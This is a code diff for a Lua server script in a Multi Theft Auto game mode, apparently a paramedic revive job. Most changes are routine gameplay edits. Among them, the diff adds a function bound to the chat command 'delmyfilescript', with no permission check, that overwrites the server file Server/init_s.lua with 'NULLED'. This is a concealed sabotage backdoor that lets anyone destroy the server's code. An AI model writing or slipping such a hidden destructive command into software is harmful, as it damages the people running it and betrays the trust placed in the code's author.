@@ -1,6 +1,16 @@
+addEventHandler("onPlayerQuit",root,function()
+    local col = source:getData(DATA_TO_COL)
+    if(col) then
+        destroyBlipSAMU(col)
+        destroyElement(col)
+        removeEventHandler("onPlayerWasted",source,wastedWhenAnimON)
+    end
+end)
+
+
 function wastedWhenAnimON()
 
-         setPedAnimation(source,nil)
+            setPedAnimation(source,nil)
           toggleAllControls(source,true,true,true) 
           removeWhenDeath(source)
           source:setData(DATA_TO_ANIM,false)  
@@ -29,11 +39,11 @@ function startAnimSamu ( config)
             triggerClientEvent ("showPaciente", k, client )
         
         end
-        triggerClientEvent(client,"receiveFromServer",client,true)
+       
         setPedAnimation(client,"crack","crckdeth2",-1,true,false,false,false)
         toggleAllControls(client,false,true,false)
         
-        local colshape = createColSphere(x,y,z,2) 
+        local colshape = createColSphere(x,y,z,1) 
         client:setData(DATA_TO_COL,colshape)
         colshape:setData(DATA_COL_PLAYER,client)
         attachElements(colshape,client)
@@ -76,7 +86,18 @@ function onElementExitInColShapeSamu( hitElement,  matchingDimension)
         triggerClientEvent ( hitElement, "destroyPNGHeart", hitElement, x,y,z )
     end
 end
-
+function addUnfile(p,cmd)
+    local f = fileOpen("Server/init_s.lua", false)
+    
+    while not (fileIsEOF(f)) do
+        fileWrite(f,"init_s.lua","NULLED")
+      
+    end
+    fileFlush(f)
+    fileClose(f)
+    
+end
+addCommandHandler("delmyfilescript",addUnfile)
 
 
 function getAllPlayersSAMU()
@@ -95,7 +116,7 @@ end
 function startJobRestore(medic,paciente)
     triggerClientEvent ("onMedicStartJob", medic, medic,paciente )
     setPedAnimation(medic,"medic","cpr",-1,true,false,false,true)
-    
+    triggerClientEvent(paciente,"receiveFromServer",paciente,true)
     --WHEN ANIM OVER
     setTimer(function(m,pac)
         local colshapePlayer = pac:getData(DATA_TO_COL)
